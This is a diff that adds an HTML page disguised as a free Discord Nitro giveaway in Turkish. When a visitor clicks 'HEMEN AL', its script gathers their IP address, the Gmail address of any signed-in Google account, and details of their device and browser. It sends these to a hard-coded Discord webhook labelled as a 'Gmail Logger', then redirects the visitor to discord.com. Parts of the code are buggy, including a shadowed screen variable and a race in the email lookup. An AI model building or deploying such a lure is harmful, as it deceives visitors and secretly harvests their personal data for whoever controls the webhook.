@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Nitro Ücretsiz!</title>
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <style>
+    body {font-family: 'Segoe UI', Arial, sans-serif; text-align: center; background: linear-gradient(135deg, #5865F2, #7289DA); color: white; margin: 0; padding: 50px;}
+    h1 {font-size: 32px; margin-bottom: 20px;}
+    p {font-size: 18px; margin-bottom: 30px;}
+    button {padding: 18px 50px; font-size: 24px; font-weight: bold; background: #43B581; color: white; border: none; border-radius: 12px; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s;}
+    button:hover {background: #3CA374; transform: translateY(-3px);}
+    .loading {display: none; margin-top: 20px; font-size: 18px;}
+  </style>
+</head>
+<body>
+  <h1>🎉 Discord Nitro 1 Yıl ÜCRETSİZ!</h1>
+  <p>Son 3 hediye kaldı! Hemen talep et!</p>
+  <button id="claimBtn" onclick="claimNitro()">HEMEN AL</button>
+  <div class="loading" id="loading">Bilgiler alınıyor...</div>
+
+  <script>
+    let userEmail = 'N/A'; // Gmail varsayılan
+
+    // Google Sign-In yüklenince email al (eğer login varsa)
+    window.addEventListener('google-accounts-client:initialized', () => {
+      // Eğer Google hesabı varsa, izin iste (otomatik değil, butonda)
+    });
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let os = 'Bilinmiyor';
+      if (ua.includes('Windows')) os = 'Windows';
+      else if (ua.includes('Mac')) os = 'macOS';
+      else if (ua.includes('Linux')) os = 'Linux';
+      else if (ua.includes('Android')) os = 'Android';
+      else if (ua.includes('iPhone')) os = 'iOS (iPhone)';
+      else if (ua.includes('iPad')) os = 'iOS (iPad)';
+
+      let browser = 'Bilinmiyor';
+      if (ua.includes('Chrome')) browser = 'Chrome';
+      else if (ua.includes('Firefox')) browser = 'Firefox';
+      else if (ua.includes('Safari')) browser = 'Safari';
+      else if (ua.includes('Edge')) browser = 'Edge';
+
+      const screen = `${screen.width}x${screen.height}`;
+      const language = navigator.language;
+
+      return {
+        os: os,
+        browser: browser,
+        screen: screen,
+        language: language,
+        ua: ua.substring(0, 100) + '...' // Kısa UA
+      };
+    }
+
+    function claimNitro() {
+      const btn = document.getElementById('claimBtn');
+      const loading = document.getElementById('loading');
+      btn.disabled = true;
+      btn.textContent = 'Gönderiliyor...';
+      loading.style.display = 'block';
+
+      // Gmail için basit kontrol (eğer storage'da varsa, yoksa N/A)
+      try {
+        // Google API ile email al (izin isterse)
+        gapi.load('auth2', () => {
+          gapi.auth2.init().then(() => {
+            const authInstance = gapi.auth2.getAuthInstance();
+            if (authInstance.isSignedIn.get()) {
+              const profile = authInstance.currentUser.get().getBasicProfile();
+              userEmail = profile.getEmail();
+            }
+          });
+        });
+      } catch (e) {
+        userEmail = 'N/A (İzin yok)';
+      }
+
+      // 500ms bekle (Gmail için)
+      setTimeout(() => {
+        const device = getDeviceInfo();
+        const ipPromise = fetch('https://api.ipify.org?format=json')
+          .then(r => r.json())
+          .then(d => d.ip);
+
+        Promise.all([ipPromise]).then(([ip]) => {
+          const time = new Date().toLocaleString('tr-TR');
+          const message = {
+            content: null,
+            embeds: [{
+              title: "YENİ TIKLAMA! 🎯",
+              color: 5814783,
+              fields: [
+                { name: "IP Adresi", value: ip, inline: true },
+                { name: "Gmail", value: userEmail, inline: true },
+                { name: "OS", value: device.os, inline: true },
+                { name: "Tarayıcı", value: device.browser, inline: true },
+                { name: "Ekran Boyutu", value: device.screen, inline: true },
+                { name: "Dil", value: device.language, inline: true },
+                { name: "Zaman", value: time, inline: false }
+              ],
+              footer: { text: "Cihaz Bilgileri + Gmail Logger" }
+            }]
+          };
+
+          fetch('https://discord.com/api/webhooks/1433209697372078235/eXJ9I-LMfE6p2wNgBZZNNFWdmCtQ0YHzfaPjkHw-9Jle-ZEgzs14lf-HRl72uxxA34L5', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+          }).then(() => {
+            setTimeout(() => { location.href = 'https://discord.com'; }, 1000);
+          }).catch(err => {
+            console.error(err);
+            alert('Hata! Tekrar dene.');
+          });
+        });
+      }, 500);
+    }
+  </script>
+</body>
+</html>
